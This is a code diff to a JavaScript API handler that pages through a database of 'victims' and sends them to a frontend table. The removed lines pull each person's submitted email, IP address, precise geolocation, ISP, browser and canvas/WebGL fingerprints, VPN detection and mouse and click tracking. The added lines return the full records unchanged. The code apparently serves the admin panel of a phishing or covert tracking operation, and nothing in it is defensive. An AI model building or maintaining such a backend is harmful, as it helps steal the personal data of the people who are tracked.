@@ -51,39 +51,9 @@ export default async function handler(req, res) {
       .limit(limit)
       .toArray();
 
-    // Format victims for response
-    const formattedVictims = victims.map((v) => ({
-      _id: v._id,
-      timestamp: v.timestamp,
-      email: v.metadata?.formData?.email || 'N/A',
-      ip: v.network?.ip || 'Unknown',
-      city: v.network?.city || 'Unknown',
-      country: v.network?.country_name || 'Unknown',
-      region: v.network?.region || 'Unknown',
-      timezone: v.network?.timezone || 'Unknown',
-      isp: v.network?.isp || 'Unknown',
-      browser: `${v.browser?.name || 'Unknown'} ${v.browser?.version || ''}`,
-      os: `${v.os?.name || 'Unknown'} ${v.os?.version || ''}`,
-      device: v.device?.type || 'Unknown',
-      platform: v.device?.platform || 'Unknown',
-      screen: v.screen?.resolution || 'Unknown',
-      timeOnPage: v.behavior?.timeOnPage || 0,
-      mouseMovements: v.behavior?.mouseMovements || 0,
-      clicks: v.behavior?.clicks || 0,
-      scrolls: v.behavior?.scrolls || 0,
-      fingerprint: v.fingerprint || 'Unknown',
-      canvasFingerprint: v.fingerprints?.canvas || 'N/A',
-      webglRenderer: v.fingerprints?.webgl?.renderer || 'N/A',
-      vpnLikely: v.network?.vpnDetection?.likelyVPN || false,
-      vpnConfidence: v.network?.vpnDetection?.confidence || 'low',
-      geolocation: v.geolocation
-        ? {
-            lat: v.geolocation.latitude,
-            lng: v.geolocation.longitude,
-            accuracy: v.geolocation.accuracy,
-          }
-        : null,
-    }));
+    // Return full victim objects (keep original structure for frontend)
+    // The frontend VictimTable expects the full nested structure
+    const formattedVictims = victims;
 
     // Calculate pagination info
     const totalPages = Math.ceil(totalRecords / limit);
